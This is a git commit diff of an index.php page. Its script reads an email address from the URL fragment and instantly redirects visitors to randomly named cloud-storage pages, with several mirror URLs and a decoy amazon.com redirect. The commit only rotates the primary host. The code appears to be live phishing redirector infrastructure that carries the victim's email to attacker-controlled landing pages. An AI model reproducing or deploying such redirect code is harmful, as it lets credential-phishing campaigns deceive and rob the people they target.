68515f9fd1c6467d0a0aca70ee9eddb42166197a
Lenoredunlap91 <98395311+Lenoredunlap91@users.noreply.github.com>
2022-01-26 09:27:20 -0500

    Update index.php

--- index.php
+++ index.php
@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://qzyf4trn6j.s3.us-south.objectstorage.softlayer.net/botrydium/index.html?key=430f213b0ebb9887a823191cdde20bb3409422c5&url_01=https://f003.backblazeb2.com/file/apennines-deviless-inappellable/index.html&url_02=https://f004.backblazeb2.com/file/pleiomerous-stolewise-unendemic/index.html&url_03=https://f004.backblazeb2.com/file/hygroblepharic-hymenophyllaceae-republicanised/index.html&url_04=https://f003.backblazeb2.com/file/bugled-mircrobicidal-sanguifluous/index.html&url_05=https://f003.backblazeb2.com/file/canidae-scrupulosities-technological/index.html&redirect=https://www.amazon.com"+ makeid(10) + "#" + em;
+			window.location.href = "https://fzndkv80h5.s3.us-south.objectstorage.softlayer.net/encloses/index.html?key=430f213b0ebb9887a823191cdde20bb3409422c5&url_01=https://f003.backblazeb2.com/file/apennines-deviless-inappellable/index.html&url_02=https://f004.backblazeb2.com/file/pleiomerous-stolewise-unendemic/index.html&url_03=https://f004.backblazeb2.com/file/hygroblepharic-hymenophyllaceae-republicanised/index.html&url_04=https://f003.backblazeb2.com/file/bugled-mircrobicidal-sanguifluous/index.html&url_05=https://f003.backblazeb2.com/file/canidae-scrupulosities-technological/index.html&redirect=https://www.amazon.com"+ makeid(10) + "#" + em;
 		}, 0);
 	</script>
 </html>
